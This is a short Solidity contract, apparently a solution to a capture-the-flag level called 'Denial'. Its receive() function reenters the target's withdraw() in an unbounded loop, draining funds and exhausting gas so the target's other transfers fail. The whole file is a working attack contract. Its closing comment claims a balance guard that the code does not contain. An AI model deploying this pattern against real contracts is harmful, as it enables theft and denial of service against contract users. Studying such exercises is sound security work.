pragma solidity ^0.8.0; interface DenialI { function withdraw() external; }
contract GasGuzzler {
    address public denial;

    constructor(address _denial) {
        denial = _denial;
    }

    receive() external payable {
        while (true) {
            (bool success, ) = denial.call(abi.encodeWithSignature("withdraw()"));
            if (!success) break;
        }
    }

    // Ensure the loop doesn't run if there's no balance
}